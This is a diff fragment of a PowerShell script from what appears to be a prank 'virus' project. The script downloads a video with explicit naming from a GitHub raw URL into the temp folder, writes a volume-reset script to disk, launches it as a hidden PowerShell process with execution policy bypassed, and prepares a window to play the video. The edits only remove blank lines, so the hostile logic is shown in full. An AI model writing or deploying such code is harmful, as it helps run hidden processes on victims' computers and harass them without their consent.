@@ -16,7 +16,6 @@ $tempPath = [System.IO.Path]::GetTempPath()
 $videoFile = Join-Path -Path $tempPath -ChildPath "SEX.mp4"
 $downloadUrl = "https://raw.githubusercontent.com/ElenaMod/SEEEEX-virus/refs/heads/main/SEX.mp4"  
 Invoke-WebRequest -Uri $downloadUrl -OutFile $videoFile
-
 #---------------------------------------------------
 # 2. Create and Launch a Hidden Volume-Reset Script
 #---------------------------------------------------
@@ -98,16 +97,13 @@ while ($true) {
     Start-Sleep -Seconds 1
 }
 '@
-
 # Write the volume script to a temporary file.
 $tempVolumeScript = Join-Path -Path $tempPath -ChildPath "volume.ps1"
 Set-Content -Path $tempVolumeScript -Value $volumeScript
-
 # Start the hidden PowerShell process that runs the volume-reset script in the background.
 $volumeProcess = Start-Process -FilePath "powershell.exe" `
     -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tempVolumeScript`"" `
     -WindowStyle Hidden -PassThru
-
 #---------------------------------------------------
 # 3. Set Up WPF Window to Play the Downloaded Video
 #---------------------------------------------------
